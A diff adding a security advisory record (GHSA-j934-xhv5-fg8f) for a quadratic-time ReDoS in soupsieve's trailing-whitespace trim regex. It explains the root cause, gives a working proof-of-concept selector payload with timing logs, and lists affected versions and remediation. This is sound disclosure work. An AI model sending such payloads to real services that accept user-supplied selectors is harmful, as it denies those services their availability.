@@ -1,0 +1,111 @@
+{
+  "id": "GHSA-j934-xhv5-fg8f",
+  "modified": "2026-09-17T20:45:05.791958465Z",
+  "published": "2026-09-17T20:32:53Z",
+  "aliases": [
+    "CVE-2026-85999"
+  ],
+  "summary": "Soup Sieve: Polynomial-time ReDoS (O(n²)) in the whitespace/comment trimming regex `RE_WS_END` (triggers on VALID selectors)",
+  "details": "## Summary\n\nBefore tokenizing, `selector_iter` trims leading/trailing whitespace and comments by running two regexes over the whole raw selector with `.search()`. The trailing one, `RE_WS_END = re.compile(r'{WSC}*$')`, is anchored only at the end (`$`), not the start. Because `.search()` retries the pattern at every offset, a long run of whitespace or CSS comments that is not sitting exactly at the end of the string makes each retry greedily consume the run and then fail `$`, producing O(n²) time. This triggers on perfectly valid selectors — e.g. a descendant combinator with a long whitespace gap, `a` + `\" \"*n` + `b` — so no malformed input is required. A single valid ~20 KB selector stalls the interpreter for ~10 s of CPU.\n\n## Trust model (Q0)\n\nThe selector string is the input, reaching this code via `soupsieve.compile()`, the `soupsieve.select/iselect/match/filter` helpers, and BeautifulSoup's `soup.select(selector)` / `soup.select_one(selector)`. Exploitable wherever an application passes a user-controlled CSS selector to BeautifulSoup/soupsieve. Applications using only hard-coded selectors are unaffected.\n\n## Root cause (exact anchors) — `src/soupsieve/css_parser.py`\n\n```python\n# line 185-186\nRE_WS_BEGIN = re.compile(fr'^{WSC}*')   # anchored at start -\u003e .search() only tries pos 0 -\u003e linear (safe)\nRE_WS_END   = re.compile(fr'{WSC}*$')   # NOT anchored at start -\u003e .search() tries every offset\n\n# selector_iter, lines ~1322-1326\nm = RE_WS_BEGIN.search(pattern)\nindex = m.end(0) if m else 0\nm = RE_WS_END.search(pattern)                     # \u003c-- O(n^2) here\nend = (m.start(0) - 1) if m else (len(pattern) - 1)\n```\n\n`WSC = (?:{WS}|{COMMENTS})`. For `RE_WS_END = (?:WS|COMMENTS)*$`, `.search()` walks start offsets 0..n. Whenever the offset lands inside a long whitespace/comment run, `(?:WS|COMMENTS)*` greedily consumes to the run's end, then `$` fails (a non-whitespace char follows), the engine backtracks the whole run, the offset advances by one, and the work repeats — O(n) offsets × O(n) per attempt = O(n²). `RE_WS_BEGIN` avoids this because `^` pins it to a single start offset.\n\nThe intent (trim trailing whitespace/comments) can be met with an anchored/loopless approach; the current unanchored `.search()` of a `*$` pattern is the defect.\n\n## Reproduction environment (discipline #12 — published artifact)\n\n- git HEAD `751c57b` (2.9, `PYTHONPATH=src`): `cd src \u0026\u0026 python3 ../poc/poc_redos_ws_trim.py`.\n- Published PyPI `soupsieve 2.8.4` (fresh `uv pip install soupsieve beautifulsoup4`): `cd poc \u0026\u0026 ../.venv-published/bin/python poc_redos_ws_trim.py` → same O(n²) (evidence: `poc/evidence_redos_ws_trim_PUBLISHED_2.8.4.log`).\n- Python 3.11.15 and 3.14.6 both reproduce.\n\n## PoC (`poc/poc_redos_ws_trim.py`)\n\n```python\nimport sys, time\nsys.path.insert(0, \".\")\nimport soupsieve as sv\n\ndef ct(sel):\n    t0 = time.perf_counter()\n    try:\n        sv.compile(sel); st = \"ok\"\n    except Exception as e:\n        st = type(e).__name__\n    return time.perf_counter() - t0, st\n\nprint(f\"soupsieve {sv.__version__}\\n\")\n\nprint(\"VALID selector 'a' + ' '*n + 'b'  (descendant combinator, lots of whitespace):\")\nfor n in (2000, 4000, 8000, 16000):\n    dt, st = ct(\"a\" + \" \" * n + \"b\")\n    print(f\"  n={n:\u003c6} len={n+2:\u003c7} {dt*1000:9.1f} ms  [{st}]\")\n\npayload = \"a\" + \" \" * 20000 + \"b\"\ndt, st = ct(payload)\nprint(f\"\\n[+] Single call: compile('a' + ' '*20000 + 'b')  (len={len(payload)})\")\nprint(f\"[+] wall time = {dt:.2f} s   [{st}]\")\n```\n\nIsolated confirmation that the cost is in `RE_WS_END.search` specifically (`poc/isolate_ws_trim.py`): `RE_WS_END` on `\"div\"+\" \"*n+\"\u003e\"` is O(n²) (2000→100 ms, 4000→448 ms, 8000→1622 ms, 16000→6719 ms), while the start-anchored `RE_WS_BEGIN` on `\" \"*n+\"x\"` stays linear (32000→1.5 ms). Profiling `compile` shows the entire wall time in 2 `re.Pattern.search` calls, not `.match`.\n\n## Evidence — HEAD 2.9 (verbatim `poc/evidence_redos_ws_trim.log`)\n\n```\nsoupsieve 2.9\n\nVALID selector 'a' + ' '*n + 'b'  (descendant combinator, lots of whitespace):\n  n=2000   len=2002        112.3 ms  [ok]\n  n=4000   len=4002        411.5 ms  [ok]\n  n=8000   len=8002       1602.9 ms  [ok]\n  n=16000  len=16002      6464.1 ms  [ok]\n\nVALID-looking 'a' + '/*x*/'*n + 'b'  (CSS comment run):\n  n=1000   len=5002         48.9 ms  [SelectorSyntaxError]\n  n=2000   len=10002       194.8 ms  [SelectorSyntaxError]\n  n=4000   len=20002       780.2 ms  [SelectorSyntaxError]\n  n=8000   len=40002      3145.3 ms  [SelectorSyntaxError]\n\n[+] Single call: compile('a' + ' '*20000 + 'b')  (len=20002)\n[+] wall time = 10.23 s   [ok]\n```\n\n## Evidence — published 2.8.4 (verbatim `poc/evidence_redos_ws_trim_PUBLISHED_2.8.4.log`)\n\n```\nsoupsieve 2.8.4\n\nVALID selector 'a' + ' '*n + 'b':\n  n=2000   len=2002        102.7 ms  [ok]\n  n=4000   len=4002        404.3 ms  [ok]\n  n=8000   len=8002       1618.2 ms  [ok]\n  n=16000  len=16002      6457.9 ms  [ok]\n[+] Single call: compile('a' + ' '*20000 + 'b')  wall time = 10.11 s   [ok]\n```\n\n## Impact — calibrated\n\n- Confirmed: quadratic CPU per `compile()`/`select()` call on an attacker-controlled selector, triggered by a long internal whitespace or CSS-comment run. ~8 KB → ~1.6 s; ~20 KB → ~10 s; scaling ~×4 per input doubling. Notably fires on WELL-FORMED selectors, so it does not depend on a parser error path.\n- Realistic exposure: services that accept user-supplied CSS selectors and feed them to BeautifulSoup/soupsieve.\n- NOT claimed: exponential blowup, memory corruption, or code execution. Availability (DoS) only, and only where selectors are attacker-influenced.\n\n## Distinction from the IDENTIFIER/VALUE ReDoS\n\nThis is a separate root cause and a separate fix: the cost here is entirely in the `RE_WS_END = {WSC}*$` trim step run with `.search()` before tokenizing (measured in `re.Pattern.search`), whereas the IDENTIFIER/VALUE issue is adjacent-quantifier backtracking during token `.match()`. They can be fixed independently.\n\n## Remediation\n\n- Anchor or de-loop the trailing-trim step: instead of `.search()` of `{WSC}*$`, scan trailing whitespace/comments from the end directly (e.g. reverse scan, or `re.compile(r'^{WSC}*').match` on a reversed-equivalent), so no per-offset retry occurs.\n- Alternatively strip whitespace/comments in a single forward tokenizing pass rather than with a pre-pass `*$` search.\n- Defense-in-depth: cap selector length before compiling.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "soupsieve",
+        "purl": "pkg:pypi/soupsieve"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.9.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.4",
+        "0.5",
+        "0.5.1",
+        "0.5.2",
+        "0.5.3",
+        "0.6",
+        "1.0",
+        "1.0.1",
+        "1.0.2",
+        "1.0b1",
+        "1.0b2",
+        "1.1",
+        "1.2",
+        "1.2.1",
+        "1.3",
+        "1.3.1",
+        "1.4",
+        "1.5",
+        "1.6",
+        "1.6.1",
+        "1.6.2",
+        "1.7",
+        "1.7.1",
+        "1.7.2",
+        "1.7.3",
+        "1.8",
+        "1.9",
+        "1.9.1",
+        "1.9.2",
+        "1.9.3",
+        "1.9.4",
+        "1.9.5",
+        "1.9.6",
+        "2.0",
+        "2.0.1",
+        "2.1",
+        "2.2",
+        "2.2.1",
+        "2.3",
+        "2.3.1",
+        "2.3.2",
+        "2.3.2.post1",
+        "2.4",
+        "2.4.1",
+        "2.5",
+        "2.6",
+        "2.7",
+        "2.8",
+        "2.8.1",
+        "2.8.2",
+        "2.8.3",
+        "2.8.4"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-j934-xhv5-fg8f/GHSA-j934-xhv5-fg8f.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/facelessuser/soupsieve/security/advisories/GHSA-j934-xhv5-fg8f"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-85999"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/facelessuser/soupsieve/commit/cf198fcddc9230f06ed39f974eba0ce076b85cda"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/facelessuser/soupsieve"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/facelessuser/soupsieve/releases/tag/2.9"
+    }
+  ]
+}
